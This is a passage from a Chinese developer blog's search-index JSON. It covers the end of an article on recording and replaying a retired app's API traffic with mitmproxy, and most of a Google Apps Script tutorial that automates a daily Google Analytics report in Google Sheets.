\"connect_id\", \"device_id\", \"device_name\", ] }, \"formData\": { \"parameters\": [ \"aidck\", \"device_id\", \"ver_name\", ] } } } } } }}以上參數在計算 Hash 值時都會被排除，也能針對個別 Endpoint 路徑設定特定排除規則。5. 啟用錄製，在 Terminal 下改執行：mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json --set record=true \"~d zhgchg.li\" 結尾的 \"~d zhgchg.li\" 意思是只截取 * .zhgchg.li 的流量。 dumper_folder : 輸出目的目錄名稱6. 回到手機上操作目標 App 執行欲錄製的流程路徑 建議重啟、重安裝 App 用最乾淨的方式開始操作 建議可以搭配錄影，以利記得復現步驟邊操作的同時，就能看到輸出目錄會有很多擷取下來的 API Response Data，會照著 Domain -&gt; API 路徑 -&gt; HTTP 方法 -&gt; Hash 值 -&gt; Header-X / Content-X 存放(若相同 Hash 請求兩次，會按照順序儲存下來)。 重新錄製可以直接刪出輸出目錄，讓他重新擷取。 如果回傳的資料包含個資，請記得調整擷取內容去識別化。[肉] 回放擷取到的 API Response Data錄製完畢後請務必要嘗試回放一次，測試資料是否正常，若 Hash Hit 很低(回放時幾乎都沒找到對應的 Response)，可以重複嗅探步驟找到那個每次執行 App 都不確定影響 Hash 值的變數並將其排除。執行回放：mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json dumper_folder : 輸出目的目錄名稱 預設本地沒有 Hash Mapping 到的 Response Data 會直接回傳 404 讓 App 空白，這樣才能知道擷取的資料有沒有效。 錄製擷取時有經過過的路徑頁面，回放時能重新顯示：OK! 錄製擷取時沒經過過的路徑頁面，回放時顯示網路錯誤：OK!緬懷至此，我們已經可以自行透過還原骨與最後的肉，來復現當年 App 走進終點站前的最後時光，以此緬懷那個大家一起同心協力生產出來的時光。以此篇文章紀念第一份工作的團隊與當年從網頁後端開發邊做邊學轉職 iOS App 開發，獨立從無到有在 3–4 個月的短暫時間，與 Android、設計、PM 主管、後端同事一同順利生產出的產品，雖然它即將進入生命週期的終點站，但我永遠都會記得當年的酸甜苦辣與第一次看到他上線、有人使用的那個感動。 「謝謝」歡迎協助貢獻如果你也有相同的遺憾，希望本篇文章也能幫助到你，因為 mitmproxy-rodo 當初只是 POC 概念驗證下開發出的工具，歡迎協助貢獻、提出遇到的 Bug 或開 PR 修改 Bug。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 484 Total Views Last Statistics Date: 2025-08-15 | 464 Views on Medium." }, { "title": "使用 Google Apps Script 實現每日數據報表 RPA 自動化", "url": "/posts/zrealm-robotic-process-automation/%E4%BD%BF%E7%94%A8-google-apps-script-%E5%AF%A6%E7%8F%BE%E6%AF%8F%E6%97%A5%E6%95%B8%E6%93%9A%E5%A0%B1%E8%A1%A8-rpa-%E8%87%AA%E5%8B%95%E5%8C%96-f6713ba3fee3/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, roboticprocessautomation, rpa-solutions, google-apps-script, google-sheets", "date": "2024-04-14 23:16:45 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script 實現每日數據報表 RPA 自動化使用 Google Apps Script 進行 Google Workspace 相關服務之 Robotic Process Automation ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script 實現每日數據報表 RPA 自動化使用 Google Apps Script 進行 Google Workspace 相關服務之 Robotic Process Automation 自動化Photo by Possessed PhotographyRobotic Process AutomationRPA (Robotic Process Automation) 中文翻譯為「流程自動化機器人」回顧人類發展歷史，從徒手採集到石器時代再到農耕文明，從上個世紀的工業革命開始到近 20 年的資訊崛起，人類的工作效率與產能有了指數級的飛躍成長；這一路上無處不在 RPA 應用的身影，農耕時期的水車(自動化脫穀工作)、工業革命的紡織機(自動化紡織工作)、工廠機械手臂(自動化組裝工作)，最後是本篇要介紹的，自動化資訊相關工作，例如：自動查詢報表、自動通知…等等工作。說來慚愧，我也是最近才知道這個名詞，打從從第一份工作開始 (7 年前)，就一直有在做 RPA 的事，諸如撰寫爬蟲統計數據、自動化 CI/CD 流程、自動化查詢數據、自動化穩定性數據告警、自動化每日例行操作…等等；不過以往我都以「自動化」三個字作為代稱，是時候給他一個正名了 — RPA (Robotic Process Automation)。之前所做的 RPA 更多只關注在「動手寫程式實現自動化工作解決單一問題」上 ，少了前期的完整評估與分析、No/Low Code 工具使用、法規、運行監控、實際數據統計、持續改進、企業文化推廣…等等，這都是完整的 RPA 需要做的事；不過如同前面所說，我也是最近才知道這個專業領域，就容我還是先以實作方面水一篇文章吧！提供 RPA 服務的平台有很多，例如 Automation Anywhere,UiPath, Microsoft Power Automate, Blue Prism 或是 Zapier, IFTTT, Automate.io …要依照實際想解決的問題與平台挑選適合的服務。推薦一套免費開源基於瀏覽器的 RPA Tool: Automa 。 另外廣義來說，將人與人或人與事的主動依賴轉化成人對平台、事對平台的依賴也是一種 RPA。 例如：統一使用 Asana/Jira…等專案管理工具統一管理工作事項。 基於主動轉被動的理念，原本需要人工上去檢查有無新通知的服務，我們也可以實現一個 RPA，當有新變動時自動通知我們。 例如：之前實現過的 Gmail to Slack 將特定通知信件轉發到工作群組。Robotic Process Automation 的效益評估之前在「 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 」分享過積少成多及心流中斷的成本問題；假設一件例行重複性的工作，每次需要花費 15 分鐘解決，每週會發生 10 次，一年下來就浪費將近 130 小時；如果再算上「心流切換」成本，最終可能浪費近 200 小時一年。2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 心流切換的意思是，當我們專注在重要的事情上做得正 High! 時，需要暫停去處理其他事情，處理完畢再回來重新進入狀態所耗費的時間。開發 RPA 的效益評估可參考下圖，只要開發所需時間跟遇到的頻率大於所浪費的時間，就值得投入資源實現：https://twitter.com/swyx/status/1196401158744502272 X 軸：任務發生頻率 ex: 50/Day (50次一天) Y 軸：任務每次需花費多少人力時間才能完成 耗費時間 Range 抓 5 年來算，表格中間表示 5 年下來浪費的時間人力成本 白色為可能投入做自動化的時間成本大於能得到的效益，不值得改善 綠色表示值得自動化的項目 紅色為強烈建議轉為自動化 除了節省時間之外，自動的制式化流程也能減少人工出錯機率，提升穩定性。Robotic Process Automation 跟 AI 的關係隨著 AI 興起，RPA 也經常被提及；但我覺得 RPA 與 AI 並無直接關係， 沒有 AI 的年代早就有 RPA，企業導入 AI 的幫助可能還沒有完善 RPA 的效益來得高，RPA 更多的還是企業文化、工作習慣的問題 ；不過不可否認 AI 確實能幫助 RPA 邁向下一個層次，例如以往 RPA 只能做確切、例行的工作，有了 AI 就能做一些模糊的、較動態的、智能判斷的工作。Robotic Process Automation at Google WorkspaceGoogle Workspace (舊稱 G Suite)，是我們日常辦公協作的好夥伴，信箱使用 Gmail 託管、文件放在 Google Doc、報表使用 Google Sheet、表單使用 Google Form…等等，這些服務之間的串接或是與內外部系統的溝通，都需要我們實現 RPA 來完成。但 Google 並沒有提供直接的 RPA 服務，可以透過以下幾個服務達成： No Code： App Sheet (付費服務)，讓非開發人員直接透過 GUI 搭建服務串接自動化。 Low Code： Google Apps Script (免費服務)，簡單撰寫程式就能快速直接的橋接 Google 服務、外部/內部系統。 Function as a Service： Cloud Functions (付費服務，提供免費額度)，撰寫完整程式碼、服務，透過 Google Cloud 部署直接執行。No Code 平台 App Sheet 我沒接觸過， Cloud Functions 與 Google Apps Script 算蠻有經驗的，以下是一些個人之前的使用與選擇經驗分享：Cloud Functions 需部署執行 支援使用多種程式語言撰寫：Node.js, Python, Java, Go, PHP, Ruby… 支援第三方套件依賴管理、安裝並使用 支援完整身份驗證機制 最多執行時間上限： 60 分鐘 用多少算多少：依照次數、執行時間、不同處理器、使用的記憶體收費 受限冷啟動問題(太久沒呼叫，再次呼叫，第一次會需要較長響應時間) 無法直接串接 Google 服務，需要走 Auth/API 驗證 免費方案如下 Cloud Functions 針對運算時間資源提供永久免費方案，當中包括 GB/秒和 GHz/秒的分配方式。除了 200 萬次叫用以外，這個免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路資料傳輸量。免費方案的使用額度，是以上述級別 1 價格的同等美元金額計算。無論執行函式的區域採用的是級別 1 和/或級別 2 價格，系統都會分配同等美元金額給您。不過在扣除免費方案的額度時，系統將以函式執行區域的級別 (級別 1 或級別 2) 為準。請注意，即便您採用的是免費方案，也必須擁有有效的帳單帳戶。總結來說，Cloud Functions 可以提供較完整與複雜的 RPA 串接功能或是有較多的外部 API 串接需求時比較建議使用 Cloud Functions。之前使用過 Cloud Functions 的案例有： [Slack ChatGPT 對話機器人]： Slack &amp; ChatGPT Integration [自動簽到機器人]： 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事都是與非 Google Workspace 服務整合且須橋接其他外部服務時我會使用。Google Apps Script 方便簡單快速 完全免費 串接服務無需繁瑣複雜的 Auth 身份驗證(Google Apps Script 是直接使用當前執行的帳號做為執行身份) 內建排程、行事曆觸發器功能 使用 Google 網路執行網路請求 只能使用 Google Apps Script (基於 JavaScript) 的語言開發 不支援套件管理工具、無版控功能 基於安全問題， 無法客製化 Request User-Agent 資訊 執行時間上限，腳本必須在 6 分鐘內完成工作，否則會被終止。 其他限制與配額請參考官方的 GAS 資訊 ：之前使用過 Google Apps Script 的案例有： [串接 Slack x Google Form x Google Sheet]： Slack 打造全自動 WFH 員工健康狀況回報系統 [串接 Slack x Gmail]： 運用 Google Apps Script 轉發 Gmail 信件到 Slack [串接 Google Analytics x Slack]： Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate [串接 Firebase Crashlytics x Big Query x Slack]： Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 [串接 Github x LineBot]： 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier受限於執行時間與 API Request 客製化限制，只有簡單快速的服務我會使用 Google Apps Script 達成；或是需要與 Google 服務串接的需求，我會優先選擇使用 Google Apps Script (因為用 Cloud Functions 要多實現完整的 Google 服務身份驗證流程)。Robotic Process Automation with Google Apps Script — 工作日報表 (Google Sheet x Google Analytics)終於來到本篇的主題，使用 Google Apps Script 實現 Google 服務 RPA 自動化。背景產品團隊需要每日查詢 Google Analytics 數據並填寫到 Google Sheet 數據報表上，共團隊分析趨勢使用；並將每日數據內容發佈到 Dashboard 螢幕上，讓所有成員掌握目前狀況。同事每日一到公司就要花大約 30 分鐘左右完成此任務；如果有其他事要處理就需要等到這件例行工作完成才會開始或會延後發布每日數據訊息。簡單估計一下 RPA 效益： 每年消耗支出：1 人 x 30 mins x 365 天(假日數據也要補) = 182 hours 建立自動化成本：以此案例來說，約需耗費 1 人 x 5天 = 40 hours 因此我們只需要投入一週開發時間，就能長遠解決負責查數據同事的工作消耗，他就可以把精力放在更重要的事情上。目標我們的目標是使用 Google Apps Script 建立一個 RPA 自動從 Google Analytics 與內部系統報表 API 撈取每日數據並填入 Google Sheet，與搭建一個 Web UI Dashboard。最終效果 Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec 數據為假數據，純 Demo 使用；從 2024/04/13 開始會特別低或都保持在 0，因為我的 zhgchg.li GA 真的是「0」流量 Q_Q。需完成的任務 建立 Google Apps Script、熟悉編輯器 取得/建立對應日期的 Sheet 串接 Google Analytics 撈取數據 填充資料 設定排程，每日自動執行聲明因文章說明需求，以下程式碼會盡可能少一點抽象，增加說明性，您可依照自己實際的需求進行改寫。 文末有附上完整公開的 Google Sheet &amp; Google Apps Script，如果你懶得一步一步走，可以直接從文末附的範本去修改。Step 1. 建立 Google Apps Script只需在我們要導入自動化的報表上選擇「擴充功能」-&gt;「Apps Script」就能自動建立與 Google Sheet 報表連結的 Google Apps Script。另外也可以直接從 Google Apps Script 首頁建立 Google Apps Script ，不過這樣就不會與 Google Sheet 產生連結。 並非需要連結才能操作對應 Google Sheet ，兩種建立方式都可以，差別在於 Script 的所有權歸於誰，如果是連結報表的就是歸報表擁有者，如果是自己建立的就是歸建立著；擁有者會關係到假設該帳號因離職停用，腳本是否會失效被刪除。腳本建立後，我們可以先從上方 Rename 我們的腳本專案名稱。Google Apps Script 基礎知識再到下一步撰寫程式之前，先補充一些 Google Apps Script 的基礎知識。關於編輯器預設引入 Google 服務的 SDK (不需特別引入即可呼叫使用)： CalendarApp 行事曆 DocumentApp Google Drive FormApp Google Form SpreadsheetApp Google Sheet GmailApp Gmail 其他… 檔案：可新增多個 .gs 檔案存放不同物件程式碼，方便整理；所有檔案都會在同個 Namespace、生命週期下執行，因此要注意物件名稱、變數名稱如果重複可能會互相覆蓋。除 .gs 指令碼 檔案外，也能新增 .html HTML Template 檔案，用於渲染 Web UI。(後面會再介紹) 資料庫：別人撰寫好的資料庫 (a.k.a Lib) 我們可以透過他的 Script ID 引入使用，當然我們撰寫好的程式也能部署成資料庫給別人用。另外也有一些大神幫忙封裝的工具可以用，缺點是只能從 Google 搜尋 Script ID，官方並沒有正式的資料庫列表共查詢使用。e.g. HTML Parser Tool Cheer.io Script ID: 1ReeQ6WO8kKNxoaA_O0XEQ589cIrRvEBA9qcWpNqdOP17i47u6N9M5Xh0 服務：Google 服務的 SDK，預設沒有引入的服務可以再此追加引入使用。e.g. Google Analytics Data 還原、下一步操作 儲存 或 Control + s 執行 或 Control + r遇到錯誤直接在 Console 提示並終止腳本 偵錯有下 Break point (10) 的地方執行到會暫停中斷並跳出右側 Debug View，可按繼續執行遇到錯誤會暫停中斷並跳出右側 Debug View 偵錯、執行的目標方法(Function Name)僅能選擇當前選擇的檔案所擁有的方法。 查看編輯器執行紀錄 另外還有一點就是排版，有的瀏覽器按下「Control + [」進行縮排時會觸發返回上一頁，這點要注意！Google Apps Script GitHub Assistant Chrome Extension 版控外掛 建議安裝此 Extension 讓 Google Apps Script 與 git 串接，使其有版本控制功能，防止心血不小心改壞。 如果遇到 Push/Pull Error 或點了沒反應，請先按照上面步驟「選項」-&gt; 連接 Github or 重新驗證一次 Google 授權，即可。Logger Message可使用以下 Script 搭配 Debug 就能在底下 Console Print 出 Debug Log。Logger.log(\"Hi\")執行紀錄、錯誤資訊如果在編輯器上執行時的 Log 或報錯會直接顯示，如果要查訊執行紀錄或自動執行時發生的錯誤，可到「執行項目」頁籤查看。自動觸發「觸發條件」頁籤可設定腳本中的方法該如何自動觸發執行，可以設定的自動觸發條件有： 當 Google Sheet：開啟時、編輯時、內容變更時、提交表單時 執行 排程週期觸發：每 X 分鐘、X 小時、X 日、X 週、X 月 執行一次 特定日期觸發：YYYY-MM-DD HH:MM 時執行 當 行事曆：更新時 執行錯誤通知設定，可設定當腳本執行出錯時如何通知你。授予執行權限身份 首次執行/部署或新增引入的服務、資源，都需要重新跑一次身份授權，授權完之後的執行都會用你授權的身份執行，所以也要確保你授權(通常是當前)的帳號有該資源、服務的權限。(e.g. 例如要有該 Google Sheet 權限)。跳出帳號選擇 Pop-up 後選擇授權執行的帳號(通常是選當前 Google Apps Script 帳號)：出現「Google hasn’t verified this app」因為我們要開發的 App 是給自己用的，不需經過 Google 驗證。直接點擊「Advanced」-&gt;「Go to XXX (unsafe)」-&gt;「Allow」即可：完成授權後就能成功執行腳本，如果沒有改動資源不需要再重新授權。2. 取得/建立對應日期的 Sheet了解完基礎知識後，我們就可以撰寫第一個功能的程式了。我們建立以下多個檔案方便我們存放不同物件DailyReportStyle.gs 欄位樣式物件：class HeaderStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#e3284b\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class ContentStyle { constructor() { this.color = \"#000000\"; this.backgroundColor = \"#ffffff\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class HeaderDateStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#001a40\"; this.bold = true; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}DailyReportField.gs 欄位資料物件：class DailyReportField { constructor(name, headerStyle, contentStyle, format = null, value = null) { this.name = name; this.headerStyle = headerStyle; this.contentStyle = contentStyle; this.format = format; this.value = value; }}DailyReport.gs 報表主程式邏輯：class DailyReport { constructor(sheetID, date) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; this.sheetFields = [ new DailyReportField(\"日期\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"星期\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"日流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC 流量) + 5(Mobile 流量) new DailyReportField(\"PC 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Mobile 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"註冊數\", new HeaderStyle(), new ContentStyle(), \"#,##0\") ] // 日流量公式分解說明： // 1. COLUMN() 函數會回傳目前單元格的列號碼。 // 2. ADDRESS(1, COLUMN(), 4) 會以給定的行數（`COLUMN()` 的結果）和固定的列數（1）來生成一個絕對引用的地址。其中，第三個參數 4 表示不帶任何美元符號（$）的相對地址。比如，如果你在第三列的任何單元格中使用這個函數，它會回傳 \"C1\"。 // 3. SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") 會將 ADDRESS 函數產生的地址中的數字 1 移除，因此只保留了列的英文字母，比如：\"C\"。 // 4. INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 4) 這邊 &amp; 4 其實應該是 &amp;4。`SUBSTITUTE` 函數的結果會和數字 4 連接，形成 \"C4\" 這樣的字符串，然後 INDIRECT 函數會將這個字符串轉換成對應的單元格引用。所以，如果你在列 C 中的任何單元格使用此公式，它會引用 C4。 // 5. 類似地，`INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 5)` 會引用相同列的第五行的單元格。比如，如果你在列 C 中的任何單元格使用此公式，它會引用 C5。 // 6. 最後，這兩個 INDIRECT 函數引用的單元格值相加。 } execute() { const sheet = this.getSheet(); } // 取得給定日期的目標 Sheet getSheet() { // 以月來區分 Sheet，找到當月 Sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // 無則建立新的月 Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // 月 Sheet 命名規則 getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // 建立新的月 Sheet makeMonthSheet() { // 新增當月 Sheet，移動到第一個位子 var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // 新增第一欄，欄位名稱、設定 Pinned、寬度 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // 填充欄位名稱 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // 設定欄高 thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // 設定 Pinned 第一、二列(日期、星期) thisMonthSheet.setFrozenRows(2); // 新增總計欄位 thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // 新增一欄在最後一欄 const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // 填充總計欄位 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // 日期... this.setContent(range, \"總計\", style); } else if (summaryRowIndex == 2) { // 星期...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"總計\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); // 1. IFERROR(value, [value_if_error]) 函數用於判斷公式中是否存在錯誤，並在有錯誤時返回指定的值。它接受兩個參數：`value` 是需要計算的表達式或函數，`value_if_error` 是當 value 發生錯誤時返回的值。在這個情境下，如果 SUM 函數中的計算發生錯誤，則返回 0。 // 2. SUM(range) 函數用於計算範圍內所有數字的總和。 // 3. INDIRECT(ref_text, [is_A1_notation]) 函數將文字字串轉換成單元格引用。這裡使用 INDIRECT 函數是為了動態生成所需的參照範圍。 // 4. SUBSTITUTE(text, old_text, new_text, [instance_num]) 函數在文字字串中替換指定的文字。這裡使用 SUBSTITUTE 是為了將 ADDRESS 函數回傳的地址中的 \"1\" 替換成其他內容。 // 5. ADDRESS(row, column, [abs_num], [a1], [sheet]) 函數根據給定的行列號碼回傳對應的單元格地址。在這裡，ADDRESS(1, 1, 4) 生成了第一行第一列的單元格地址，但是由於 abs_num 是 4，所以地址不包含工作表名稱和固定符號 $。類似地，`ADDRESS(1, COLUMN() - 1, 4)` 產生了從第一行到當前列前一列的單元格地址。 // 6. COLUMN() 函數回傳當前單元格的列號。 // 7. summaryRowIndex = 所在列 } } return thisMonthSheet; } setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Main.gs 做為主程式入口：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\"// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute();}完成後我們回到「 Main.gs 」選擇「debug」並按下偵錯，查看執行結果是否正確、有無出錯。執行正確回到報表會出現當前新月份，並帶入預設欄位與總計欄位，如果已存在則不會有反應。3. 串接 Google Analytics 撈取數據首先需要新增「AnalyticsData」服務：使用 GA4 Debug Tool 構建查詢條件： https://ga-dev-tools.google/ga4/query-explorer/ 可邊比照 GA 4 後台篩選條件構建 本文以查詢 Sessions 數為例，區分裝置 Grouping登入授權後選擇目標資源：記下 property 底下顯示的數字，即為你要查詢的資源 GA Property ID。設定查詢參數、Filter 條件：按下「Make Reqeust」取得 Response 結果：可同步比較 GA 4 後台同樣條件的數據是否相同，如果落差太大可能是有 Filter 條件沒有加到，要再檢查一下。小記附上一個行銷同事發現的小坑，GA 有些數據會有延遲問題，可能今天查的跟昨天查的數字會不一樣(例如跳出率)，因此最好能將資料回溯幾天才能卻保值是最終的數字。 GA Debug Tool 沒問題之後我們就能將它轉換為 Google Apps Script。新增一個 GAData.gs 檔案：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// GA Debug Toole: https://ga-dev-tools.web.app/ga4/query-explorer/class GAData { constructor(date) { this.date = date; const traffic = this.fetchGADailyUsage(); this.pc_traffic = traffic[\"desktop\"]; this.mobile_traffic = traffic[\"mobile\"]; } fetchGADailyUsage() { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"deviceCategory\"; const metric = AnalyticsData.newMetric(); metric.name = \"sessions\"; const dateRange = AnalyticsData.newDateRange(); // 預設查詢給定日範圍內資料 e.g. 2024-01-01 ~ 2024-01-01 dateRange.startDate = this.getDateString(); dateRange.endDate = this.getDateString(); // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // const filter = AnalyticsData.newFilter(); // filter.fieldName = \"landingPagePlusQueryString\"; // const stringFilter = AnalyticsData.newStringFilter() // stringFilter.value = \"/life|/article|/chat|/house|/event/230502|/event/230310\"; // stringFilter.matchType = \"PARTIAL_REGEXP\"; // filter.stringFilter = stringFilter; // filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // filterExpression.expression = filterExpression; // request.dimensionFilter = filterExpression; // or Not // const notFilterExpression = AnalyticsData.newFilterExpression(); // notFilterExpression.notExpression = filterExpression; // request.dimensionFilter = notFilterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + gaPropertyId).rows; // 無資料 if (report == undefined) { return {\"desktop\": 0, \"mobile\": 0}; } // [{metricValues=[{value=4517}], dimensionValues=[{value=mobile}]}, {metricValues=[{value=3189}], dimensionValues=[{value=desktop}]}, {metricValues=[{value=63}], dimensionValues=[{value=tablet}]}] var result = {}; report.forEach(function(element) { result[element.dimensionValues[0].value] = element.metricValues[0].value; }); return result; } getDateString() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM-dd\"); }}Main.gs 新增測試內容：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute(); // var gaData = new GAData(new Date()); Logger.log(gaData);}按下執行或偵錯取得程式撈取結果：OK! 比對相符。此步驟完成時，目錄檔案結構如上圖。4. 填充資料建好 Sheet、查好資料後，再來就是填充資料到欄位中。調整 DailyReport.gs 增加 by 日期新增欄位＆填充資料的邏輯：class DailyReport { constructor(sheetID, date, gaData, inHouseReportData) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; const dateString = Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\"); const weekString = [\"星期日\", \"星期一\",\"星期二\",\"星期三\",\"星期四\",\"星期五\",\"星期六\"][date.getDay()]; // 取得星期，星期日為0，星期一為1，以此類 this.sheetFields = [ new DailyReportField(\"日期\", new HeaderDateStyle(), new HeaderDateStyle(), null, dateString), new DailyReportField(\"星期\", new HeaderDateStyle(), new HeaderDateStyle(), null, weekString), new DailyReportField(\"日流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC 流量) + 5(Mobile 流量) new DailyReportField(\"PC 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.pc_traffic), new DailyReportField(\"Mobile 流量\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.mobile_traffic), new DailyReportField(\"註冊數\", new HeaderStyle(), new ContentStyle(), \"#,##0\", inHouseReportData.registers) ] } execute() { const sheet = this.getSheet(); const dateColumnIndex = this.makeOrGetDateColumn(sheet); // 取得已存在的更新或建立新的欄位 // 填充欄位內容 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const rowIndex = parseInt(currentRow) + 1; if (rowIndex != null) { const range = sheet.getRange(rowIndex, dateColumnIndex); const text = sheetField.value; const style = sheetField.contentStyle; this.setContent(range, text, style); this.setFormat(range, sheetField.format); } } } // 取得給定日期的目標 Sheet getSheet() { // 以月來區分 Sheet，找到當月 Sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // 無則建立新的月 Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // 月 Sheet 命名 getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // 建立新的月 Sheet makeMonthSheet() { // 新增當月 Sheet，移動到第一個位子 var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // 新增第一欄，欄位名稱、設定 Pinned、寬度 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // 填充欄位名稱 for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // 設定欄高 thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // 設定 Pinned 第一、二列(日期、星期) thisMonthSheet.setFrozenRows(2); // 新增總計欄位 thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // 新增一欄在最後一欄 const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // 填充總計欄位 for(const currentRow in this.sheetFields) { const sheetField = 